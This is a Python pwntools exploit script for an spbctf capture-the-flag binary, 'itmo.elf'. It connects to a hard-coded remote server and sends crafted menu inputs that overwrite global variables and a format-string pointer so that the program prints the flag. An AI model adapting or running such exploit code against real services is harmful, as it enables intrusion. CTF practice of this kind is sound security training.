#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import re

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./itmo.elf')

if exe.bits == 32:
    lindbg = "/root/linux_server"
else:
    lindbg = "/root/linux_server64"


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11655)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(['qira', exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments
rectors_bool = 0x6020F0
grades_array_addr = 0x602100
format_string_ptr_addr = 0x602120

io = start()
io.recvuntil("enter your name:")
io.sendline("Rozetkin")

# change programm to ptr and make years_count = -1
io.recvuntil("\n?")
io.sendline(str(4))
io.sendline(str(rectors_bool))
io.sendline(str(rectors_bool))
io.sendline("1")
io.sendline("1 1 1 1 1 1 -1")
for i in range(7):
    io.sendline("5")
io.sendline("3")


# break format string
io.sendline("1")

io.recvuntil("What new grades have you got? (enter -1 to finish)")
pl = 32*b"100 "

pl += b"-1 "
io.sendline(pl)

io.sendline("1")
io.sendline(str(0x1c + 21))

io.sendline("1")
io.sendline(str(0x1c))

for i in range(6):
    io.sendline("5")

# get lazy for 4 years
for i in range(4):
    io.sendline("1")
    io.sendline("100 100 100 100 100 100 -1")
    for i in range(8):
        io.sendline("5")

io.recvuntil("spbctf")
flag = io.recvuntil("}").decode()
log.success(f"Flag: spbctf{flag}")

io.close()

